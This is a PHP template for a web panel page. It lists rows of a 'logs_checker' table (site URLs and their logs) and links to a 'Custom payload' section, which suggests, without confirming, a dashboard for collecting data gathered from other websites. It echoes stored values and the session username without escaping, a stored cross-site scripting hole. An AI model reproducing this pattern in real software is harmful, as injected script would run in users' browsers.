<?php
require_once('includes/config.php');
?>
<div class="panel">
    <div class="ui pointing menu">
      <a href="index.php?action=panel" class="active item">Logs</a>
      <a href="index.php?action=payload" class="item">Custom payload</a>
      <a href="logout.php" class="item">Logout</a>
      <div class="right menu">
        <div class="item">
          <div class="ui transparent icon input">
            <input type="text" placeholder="Search...">
            <i class="fa fa-search"></i>
          </div>
        </div>
        <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
      </div>
    </div>
    <div class="ui segment">
      <table class="ui very basic table">
  <thead>
    <tr>
      <th>#id</th>
      <th>Url</th>
      <th>Logs</th>
    </tr>
  </thead>
  <tbody>
      <?php
    $logs = $bdd->prepare("SELECT * FROM logs_checker");
    $logs->execute();
    while($fetch = $logs->fetch())
    {
        ?>
    <tr>
      <td><?php echo $fetch['id']; ?></td>
      <td><?php echo $fetch['url_site']; ?></td>
      <td><?php echo $fetch['logs_site']; ?></td>
    </tr>
      <?php
    }
      ?>
  </tbody>
</table>
    </div>
</div>